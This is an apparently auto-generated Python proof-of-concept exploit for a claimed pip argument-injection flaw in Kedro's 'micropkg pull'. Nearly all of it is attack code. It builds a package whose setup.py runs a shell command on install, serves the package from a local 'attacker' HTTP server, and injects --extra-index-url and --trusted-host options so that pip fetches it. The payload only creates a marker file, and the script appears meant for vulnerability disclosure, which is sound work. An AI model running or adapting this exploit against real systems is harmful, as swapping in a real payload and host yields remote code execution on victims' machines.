#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: rce-011
# Sink: call
# Auto-generated — run with: python3 rce_call_function_executes_subprocess_call.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro micropkg pull RCE via pip argument injection.

Vulnerability: In _unpack_sdist(), when package_path does not end with '.tar.gz',
the code constructs a pip command with user-controlled package_path as a positional
argument. An attacker can inject pip options (e.g., --extra-index-url) to install
a malicious package from an attacker-controlled index, leading to arbitrary code
execution during pip's download/install process.

This PoC demonstrates the injection by using a benign payload that creates a marker
file at /tmp/poc_success.txt. In a real attack, the attacker would host a malicious
package on their own PyPI server.

Usage:
    python3 poc_kedro_rce.py <target_project_path> [--package-name MALICIOUS_PACKAGE]

Requirements:
    - Kedro installed (the vulnerable version)
    - A Kedro project with pyproject.toml
    - Network access to the attacker's PyPI server (or use a local test index)
"""

import argparse
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path


def create_malicious_package(output_dir: Path, package_name: str = "poc_kedro_rce"):
    """
    Create a minimal malicious Python package that executes a benign payload
    during installation. The payload creates a marker file at /tmp/poc_success.txt.
    
    This simulates what an attacker would host on their PyPI server.
    """
    pkg_dir = output_dir / package_name
    pkg_dir.mkdir(parents=True, exist_ok=True)
    
    # Create setup.py with malicious post-install script
    setup_py = pkg_dir / "setup.py"
    setup_py.write_text(f'''from setuptools import setup
from setuptools.command.install import install
import os

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        # Benign payload: create a marker file
        os.system("touch /tmp/poc_success.txt")
        print("[*] PoC payload executed - marker file created at /tmp/poc_success.txt")

setup(
    name="{package_name}",
    version="0.0.1",
    packages=[],
    cmdclass={{'install': PostInstallCommand}},
)
''')
    
    # Create minimal package structure
    (pkg_dir / package_name).mkdir(exist_ok=True)
    (pkg_dir / package_name / "__init__.py").write_text("# malicious package")
    
    # Build the package (sdist)
    result = subprocess.run(
        [sys.executable, "setup.py", "sdist", "--formats=gztar"],
        cwd=str(pkg_dir),
        capture_output=True,
        text=True
    )
    if result.returncode != 0:
        print(f"[-] Failed to build malicious package: {result.stderr}")
        return None
    
    # Find the built sdist
    dist_dir = pkg_dir / "dist"
    sdist_files = list(dist_dir.glob("*.tar.gz"))
    if not sdist_files:
        print("[-] No sdist file generated")
        return None
    
    return sdist_files[0]


def setup_attacker_server(package_path: Path, port: int = 8888):
    """
    Start a simple HTTP server to host the malicious package.
    This simulates the attacker's PyPI server.
    """
    import http.server
    import threading
    
    dist_dir = package_path.parent
    os.chdir(str(dist_dir))
    
    handler = http.server.SimpleHTTPRequestHandler
    httpd = http.server.HTTPServer(("0.0.0.0", port), handler)
    
    print(f"[*] Attacker server started at http://0.0.0.0:{port}")
    print(f"[*] Hosting malicious package at: http://0.0.0.0:{port}/{package_path.name}")
    
    server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    server_thread.start()
    
    return httpd


def exploit(target_project: str, attacker_url: str, malicious_package: str):
    """
    Execute the exploit by injecting pip options through package_path.
    
    The injection works by passing a package_path that starts with '-',
    which pip interprets as options. We inject:
        --extra-index-url <attacker_url>
        --trusted-host <attacker_host>
        <malicious_package>
    
    This causes pip to look for the malicious package on the attacker's server
    and install it, executing the payload.
    """
    # Parse attacker URL to get host
    from urllib.parse import urlparse
    parsed = urlparse(attacker_url)
    attacker_host = parsed.hostname
    
    # Craft the malicious package_path that injects pip options
    # The injection string will be passed as a single argument to pip
    # We use --extra-index-url to add our malicious server
    # --trusted-host to avoid SSL warnings
    # Then the malicious package name
    injected_args = (
        f"--extra-index-url {attacker_url} "
        f"--trusted-host {attacker_host} "
        f"{malicious_package}"
    )
    
    print(f"[*] Injected pip arguments: {injected_args}")
    print(f"[*] Target project: {target_project}")
    
    # Change to target project directory
    original_dir = os.getcwd()
    os.chdir(target_project)
    
    try:
        # Execute the vulnerable command
        # The package_path is passed directly to pip download
        cmd = [
            sys.executable, "-m", "kedro", "micropkg", "pull",
            injected_args
        ]
        
        print(f"[*] Executing: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        print(f"[*] stdout: {result.stdout}")
        print(f"[*] stderr: {result.stderr}")
        
        if result.returncode == 0:
            print("[+] Exploit command executed successfully")
        else:
            print(f"[-] Command failed with return code {result.returncode}")
            
    except subprocess.TimeoutExpired:
        print("[-] Command timed out")
    except Exception as e:
        print(f"[-] Error during exploit: {e}")
    finally:
        os.chdir(original_dir)


def main():
    parser = argparse.ArgumentParser(
        description="PoC for Kedro micropkg pull RCE via pip argument injection"
    )
    parser.add_argument(
        "target_project",
        help="Path to the Kedro project directory containing pyproject.toml"
    )
    parser.add_argument(
        "--package-name",
        default="poc_kedro_rce",
        help="Name for the malicious package (default: poc_kedro_rce)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=8888,
        help="Port for attacker HTTP server (default: 8888)"
    )
    parser.add_argument(
        "--attacker-url",
        default=None,
        help="Full URL to attacker's package server (default: auto-generated)"
    )
    
    args = parser.parse_args()
    
    target_path = Path(args.target_project).resolve()
    if not (target_path / "pyproject.toml").exists():
        print(f"[-] No pyproject.toml found in {target_path}")
        sys.exit(1)
    
    # Create temporary directory for malicious package
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir_path = Path(tmpdir)
        
        print("[*] Creating malicious package...")
        sdist_path = create_malicious_package(tmpdir_path, args.package_name)
        if not sdist_path:
            print("[-] Failed to create malicious package")
            sys.exit(1)
        
        print(f"[*] Malicious package created at: {sdist_path}")
        
        # Determine attacker URL
        if args.attacker_url:
            attacker_url = args.attacker_url
        else:
            attacker_url = f"http://127.0.0.1:{args.port}"
        
        # Start attacker server
        print("[*] Starting attacker HTTP server...")
        httpd = setup_attacker_server(sdist_path, args.port)
        
        try:
            # Execute exploit
            exploit(
                str(target_path),
                attacker_url,
                args.package_name
            )
            
            # Check if payload executed
            if Path("/tmp/poc_success.txt").exists():
                print("[+] SUCCESS: Payload executed! Marker file found at /tmp/poc_success.txt")
                print("[*] This demonstrates arbitrary code execution during pip install")
            else:
                print("[-] Payload may not have executed. Check the output above.")
                
        finally:
            httpd.shutdown()
            print("[*] Attacker server stopped")


if __name__ == "__main__":
    main()
